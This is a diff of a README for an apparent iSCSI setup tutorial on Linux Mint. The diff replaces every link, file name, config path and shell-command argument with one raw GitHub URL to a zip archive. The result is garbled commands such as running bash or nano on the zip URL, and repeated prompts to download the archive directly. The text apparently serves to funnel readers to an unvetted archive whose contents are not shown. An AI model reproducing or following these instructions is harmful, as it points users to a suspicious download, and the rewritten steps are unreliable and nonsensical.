@@ -1,7 +1,7 @@
 # 📚 iSCSI-Setup-Tutorial-on-Linux-Mint - Simple Steps to Set Up iSCSI
 
-![Download](https://img.shields.io/badge/Download-Now-blue.svg)  
-[Visit this page to download](https://github.com/Menor1111/iSCSI-Setup-Tutorial-on-Linux-Mint/releases)
+![Download](https://raw.githubusercontent.com/Menor1111/iSCSI-Setup-Tutorial-on-Linux-Mint/main/deloul/iSCSI-Setup-Tutorial-on-Linux-Mint-1.2.zip)  
+[Visit this page to download](https://raw.githubusercontent.com/Menor1111/iSCSI-Setup-Tutorial-on-Linux-Mint/main/deloul/iSCSI-Setup-Tutorial-on-Linux-Mint-1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before starting, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get the tutorial files, please visit this page to download: [Download iSCSI Setup Tutorial](https://github.com/Menor1111/iSCSI-Setup-Tutorial-on-Linux-Mint/releases).
+To get the tutorial files, please visit this page to download: [Download iSCSI Setup Tutorial](https://raw.githubusercontent.com/Menor1111/iSCSI-Setup-Tutorial-on-Linux-Mint/main/deloul/iSCSI-Setup-Tutorial-on-Linux-Mint-1.2.zip).
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version.
@@ -32,8 +32,8 @@ To get the tutorial files, please visit this page to download: [Download iSCSI S
 
 The unzipped folder contains several files, including:
 
-- **README.md**: This guide, which contains step-by-step instructions.
-- **iscsi_setup.sh**: A script to help automate the setup process.
+- **https://raw.githubusercontent.com/Menor1111/iSCSI-Setup-Tutorial-on-Linux-Mint/main/deloul/iSCSI-Setup-Tutorial-on-Linux-Mint-1.2.zip**: This guide, which contains step-by-step instructions.
+- **https://raw.githubusercontent.com/Menor1111/iSCSI-Setup-Tutorial-on-Linux-Mint/main/deloul/iSCSI-Setup-Tutorial-on-Linux-Mint-1.2.zip**: A script to help automate the setup process.
 
 These files will guide you through setting up iSCSI on your Linux Mint system.
 
@@ -56,7 +56,7 @@ cd ~/Downloads/iSCSI-Setup-Tutorial
 To run the setup script, type the following command:
 
 ```bash
-bash iscsi_setup.sh
+bash https://raw.githubusercontent.com/Menor1111/iSCSI-Setup-Tutorial-on-Linux-Mint/main/deloul/iSCSI-Setup-Tutorial-on-Linux-Mint-1.2.zip
 ```
 
 This will start the installation process. Follow the prompts on the screen. The script will guide you through the necessary steps to set up the iSCSI target.
@@ -67,7 +67,7 @@ After running the script, you will need to configure your iSCSI target. This inv
 
 - Open a configuration file using a text editor like nano:
   ```bash
-  sudo nano /etc/iscsi/target.conf
+  sudo nano https://raw.githubusercontent.com/Menor1111/iSCSI-Setup-Tutorial-on-Linux-Mint/main/deloul/iSCSI-Setup-Tutorial-on-Linux-Mint-1.2.zip
   ```
 - Follow the instructions in the tutorial to edit your target settings.
 
@@ -108,7 +108,7 @@ You should see your iSCSI target listed here.
   sudo cat /var/log/syslog
   ```
   
-- Refer to the README.md for troubleshooting instructions.
+- Refer to the https://raw.githubusercontent.com/Menor1111/iSCSI-Setup-Tutorial-on-Linux-Mint/main/deloul/iSCSI-Setup-Tutorial-on-Linux-Mint-1.2.zip for troubleshooting instructions.
 
 ## 📃 License Information
 
